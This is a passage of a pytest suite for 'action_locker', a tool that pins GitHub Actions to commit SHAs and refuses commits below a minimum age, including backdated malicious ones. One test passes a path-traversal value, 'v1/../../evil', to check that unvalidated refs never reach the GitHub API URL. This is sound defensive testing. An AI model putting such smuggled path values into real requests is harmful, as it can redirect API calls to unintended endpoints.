        data = {"version": 1, "locked": {}}
        if policy is not None:
            data["policy"] = policy
        (tmp_path / "action-lock.json").write_text(json.dumps(data, indent=2))
        return tmp_path

    def _patch(self, monkeypatch, **ages):
        monkeypatch.setattr(action_locker, "get_github_token", lambda: None)
        monkeypatch.setattr(
            action_locker, "resolve_ref_to_sha", lambda repo, ref, token=None: self.SHA
        )
        patch_commit_age(monkeypatch, **ages)

    def test_prefix_override_zero_floor_admits_fresh_repo(self, tmp_path, monkeypatch):
        """Steph's case: org's own hot repo adopted immediately — just that
        repo; everything else keeps the default floor."""
        repo = self._repo(
            tmp_path,
            policy={"overrides": [{"prefix": "steph-owl/action-locker", "min_age_days": 0}]},
            uses="steph-owl/action-locker/.github/workflows/x.yml@v1",
        )
        self._patch(monkeypatch, age_days=0.01)
        action_locker.cmd_lock(lock_args(min_age_days=None), repo)
        locked = load_lockfile(repo)["locked"]
        assert locked["steph-owl/action-locker/.github/workflows/x.yml@v1"]["resolved"] == self.SHA

    def test_non_overridden_action_keeps_default_floor(self, tmp_path, monkeypatch, capsys):
        repo = self._repo(
            tmp_path,
            policy={"overrides": [{"prefix": "steph-owl/action-locker", "min_age_days": 0}]},
        )
        self._patch(monkeypatch, age_days=0.01)
        with pytest.raises(SystemExit):
            action_locker.cmd_lock(lock_args(min_age_days=None), repo)
        assert "REFUSED" in capsys.readouterr().out

    def test_policy_min_age_days_replaces_constant_default(self, tmp_path, monkeypatch):
        repo = self._repo(tmp_path, policy={"min_age_days": 0.5})
        self._patch(monkeypatch, age_days=1)  # under 5, over 0.5
        action_locker.cmd_lock(lock_args(min_age_days=None), repo)
        assert load_lockfile(repo)["locked"]["x/y@v1"]["resolved"] == self.SHA

    def test_explicit_cli_beats_policy(self, tmp_path, monkeypatch, capsys):
        repo = self._repo(tmp_path, policy={"min_age_days": 0.5})
        self._patch(monkeypatch, age_days=1)
        with pytest.raises(SystemExit):
            action_locker.cmd_lock(lock_args(min_age_days=10.0), repo)
        assert "REFUSED" in capsys.readouterr().out

    def test_longest_prefix_wins_regardless_of_order(self, tmp_path, monkeypatch):
        repo = self._repo(
            tmp_path,
            policy={"overrides": [
                {"prefix": "steph-owl/", "min_age_days": 10},
                {"prefix": "steph-owl/action-locker", "min_age_days": 0},
            ]},
            uses="steph-owl/action-locker@v1",
        )
        self._patch(monkeypatch, age_days=0.01)
        action_locker.cmd_lock(lock_args(min_age_days=None), repo)
        assert load_lockfile(repo)["locked"]["steph-owl/action-locker@v1"]["resolved"] == self.SHA

    def test_require_trusted_age_rejects_committer_date(self, tmp_path, monkeypatch, capsys):
        repo = self._repo(tmp_path, policy={"require_trusted_age": True})
        self._patch(monkeypatch, age_days=30)  # old, but heuristic source
        with pytest.raises(SystemExit):
            action_locker.cmd_lock(lock_args(min_age_days=None), repo)
        out = capsys.readouterr().out
        assert "requires a trusted source" in out

    def test_require_trusted_age_accepts_merged_pr(self, tmp_path, monkeypatch):
        repo = self._repo(tmp_path, policy={"require_trusted_age": True})
        self._patch(monkeypatch, age_days=None, pr_age_days=30)
        action_locker.cmd_lock(lock_args(min_age_days=None), repo)
        assert load_lockfile(repo)["locked"]["x/y@v1"]["resolved"] == self.SHA

    def test_unknown_policy_key_fails_closed(self, tmp_path, monkeypatch, capsys):
        """A typo must not silently weaken the floor."""
        repo = self._repo(tmp_path, policy={"min_age_dayz": 0})
        self._patch(monkeypatch, age_days=30)
        with pytest.raises(SystemExit):
            action_locker.cmd_lock(lock_args(min_age_days=None), repo)
        assert "unknown key `min_age_dayz`" in capsys.readouterr().err
        assert load_lockfile(repo)["locked"] == {}

    def test_verify_flags_malformed_policy(self, tmp_path, capsys):
        sha = "2" * 40
        wf = tmp_path / ".github" / "workflows"
        wf.mkdir(parents=True)
        wf.joinpath("ci.yml").write_text(
            f"jobs:\n  a:\n    steps:\n      - uses: actions/checkout@{sha}\n"
        )
        data = {
            "version": 1,
            "locked": {"actions/checkout@v4": entry("actions/checkout", sha, "v4")},
            "policy": {"overrides": [{"prefix": "no-slash"}]},
        }
        (tmp_path / "action-lock.json").write_text(json.dumps(data))
        assert run_verify(tmp_path) == 1
        assert "POLICY" in capsys.readouterr().out

    def test_bool_is_not_a_valid_age(self, tmp_path, monkeypatch, capsys):
        repo = self._repo(tmp_path, policy={"min_age_days": True})
        self._patch(monkeypatch, age_days=30)
        with pytest.raises(SystemExit):
            action_locker.cmd_lock(lock_args(min_age_days=None), repo)
        assert "must be a number" in capsys.readouterr().err


# --- merged-PR rung of the trust ladder ---

class TestMergedPrRung:
    SHA = "6" * 40

    def _repo(self, tmp_path):
        wf = tmp_path / ".github" / "workflows"
        wf.mkdir(parents=True)
        wf.joinpath("ci.yml").write_text(
            "jobs:\n  a:\n    steps:\n      - uses: x/y@v1\n"
        )
        write_lockfile(tmp_path, {})
        return tmp_path

    def _patch(self, monkeypatch, **ages):
        monkeypatch.setattr(action_locker, "get_github_token", lambda: None)
        monkeypatch.setattr(
            action_locker, "resolve_ref_to_sha", lambda repo, ref, token=None: self.SHA
        )
        patch_commit_age(monkeypatch, **ages)

    def test_old_merged_pr_beats_backdated_committer_date(self, tmp_path, monkeypatch, capsys):
        """Fresh malicious commit merged just now, committer date backdated
        100 days: PR merge date (server-side) wins -> refused."""
        repo = self._repo(tmp_path)
        self._patch(monkeypatch, age_days=100, pr_age_days=0.2)
        with pytest.raises(SystemExit):
            action_locker.cmd_lock(lock_args(), repo)
        out = capsys.readouterr().out
        assert "REFUSED" in out and "merged pull request" in out

    def test_release_outranks_pr(self, tmp_path, monkeypatch, capsys):
        repo = self._repo(tmp_path)
        self._patch(monkeypatch, age_days=100, pr_age_days=100, release_age_days=0.2)
        with pytest.raises(SystemExit):
            action_locker.cmd_lock(lock_args(), repo)
        assert "immutable release" in capsys.readouterr().out

    def test_pr_rung_used_when_no_release(self, tmp_path, monkeypatch):
        repo = self._repo(tmp_path)
        self._patch(monkeypatch, age_days=None, pr_age_days=30)
        action_locker.cmd_lock(lock_args(), repo)
        assert load_lockfile(repo)["locked"]["x/y@v1"]["resolved"] == self.SHA

    def test_pr_lookup_rejects_non_sha_without_network(self, monkeypatch):
        import urllib.request

        def boom(*a, **kw):
            raise AssertionError("network request made with unvalidated sha")

        monkeypatch.setattr(urllib.request, "urlopen", boom)
        assert action_locker.get_earliest_merged_pr_date("x/y", "main") is None
        assert action_locker.get_earliest_merged_pr_date("x/y", "6" * 39) is None


# --- get_commit_date input validation ---

class TestGetCommitDateValidation:
    def test_rejects_non_sha_without_network(self, monkeypatch):
        """A non-SHA value must be rejected locally, never interpolated
        into the commits URL."""
        import urllib.request

        def boom(*a, **kw):
            raise AssertionError("network request made with unvalidated sha")

        monkeypatch.setattr(urllib.request, "urlopen", boom)
        assert action_locker.get_commit_date("x/y", "v1/../../evil") is None
        assert action_locker.get_commit_date("x/y", "main") is None
        assert action_locker.get_commit_date("x/y", "6" * 39) is None

    def test_release_lookup_without_tag_makes_no_network_call(self, monkeypatch):
        import urllib.request

        def boom(*a, **kw):
            raise AssertionError("network request made with no tag")

        monkeypatch.setattr(urllib.request, "urlopen", boom)
        assert action_locker.get_release_published_at("x/y", None) is None
        assert action_locker.get_release_published_at("x/y", "") is None


# --- commit age floor (update --apply) ---

def update_args(**overrides):
    defaults = dict(apply=True, allow_fresh=False, min_age_days=5.0)
    defaults.update(overrides)
    return argparse.Namespace(**defaults)


class TestUpdateApplyAgeFloor:
    OLD_SHA = "6" * 40
    NEW_SHA = "7" * 40

    @pytest.fixture
    def locked_repo(self, tmp_path):
        """Repo with one 3rd-party action locked at OLD_SHA on tag v1."""
        write_lockfile(
            tmp_path,
            {"x/y@v1": entry("x/y", self.OLD_SHA, "v1")},
            trusted_prefixes=["Old-Well-Labs/"],
        )
        return tmp_path

    def _patch(self, monkeypatch, age_days):
        monkeypatch.setattr(action_locker, "get_github_token", lambda: None)
        monkeypatch.setattr(
            action_locker, "resolve_ref_to_sha", lambda repo, ref, token=None: self.NEW_SHA
        )
        patch_commit_age(monkeypatch, age_days)

    def test_skips_fresh_commit(self, locked_repo, monkeypatch, capsys):
        self._patch(monkeypatch, age_days=1)
        action_locker.cmd_update(update_args(), locked_repo)
        out = capsys.readouterr().out
        assert "SKIPPED x/y" in out
        assert "age floor" in out
        lockdata = load_lockfile(locked_repo)
        assert lockdata["locked"]["x/y@v1"]["resolved"] == self.OLD_SHA

    def test_applies_aged_commit(self, locked_repo, monkeypatch, capsys):
        self._patch(monkeypatch, age_days=30)
        action_locker.cmd_update(update_args(), locked_repo)
        assert "Updated x/y" in capsys.readouterr().out
        lockdata = load_lockfile(locked_repo)
        assert lockdata["locked"]["x/y@v1"]["resolved"] == self.NEW_SHA

    def test_unknown_age_skips(self, locked_repo, monkeypatch, capsys):
        self._patch(monkeypatch, age_days=None)
        action_locker.cmd_update(update_args(), locked_repo)
        assert "of unknown age" in capsys.readouterr().out
        lockdata = load_lockfile(locked_repo)
        assert lockdata["locked"]["x/y@v1"]["resolved"] == self.OLD_SHA

    def test_allow_fresh_overrides_floor(self, locked_repo, monkeypatch):
        self._patch(monkeypatch, age_days=0.1)
        action_locker.cmd_update(update_args(allow_fresh=True), locked_repo)
        lockdata = load_lockfile(locked_repo)
        assert lockdata["locked"]["x/y@v1"]["resolved"] == self.NEW_SHA

    def test_trusted_action_exempt(self, tmp_path, monkeypatch):
        self._patch(monkeypatch, age_days=None)  # age lookup would skip

        def boom(repo, sha, token=None):
            raise AssertionError(f"age check ran for trusted repo {repo}")

        monkeypatch.setattr(action_locker, "get_commit_date", boom)
        write_lockfile(
            tmp_path,
            {"Old-Well-Labs/infra@main": entry("Old-Well-Labs/infra", self.OLD_SHA, "main")},
            trusted_prefixes=["Old-Well-Labs/"],
        )
        action_locker.cmd_update(update_args(), tmp_path)
        lockdata = load_lockfile(tmp_path)
        assert lockdata["locked"]["Old-Well-Labs/infra@main"]["resolved"] == self.NEW_SHA

    def test_invalid_trusted_prefix_warns(self, tmp_path, monkeypatch, capsys):
        """An invalid trusted_prefixes entry must be surfaced, not silently
        dropped — otherwise the resulting age-floor skip is unexplained."""
        self._patch(monkeypatch, age_days=1)
        write_lockfile(
            tmp_path,
            {"x/y@v1": entry("x/y", self.OLD_SHA, "v1")},
            trusted_prefixes=["Old-Well-Labs"],  # missing '/'
        )
        action_locker.cmd_update(update_args(), tmp_path)
        captured = capsys.readouterr()
        assert "INVALID trusted_prefixes entry" in captured.err
        assert "SKIPPED x/y" in captured.out
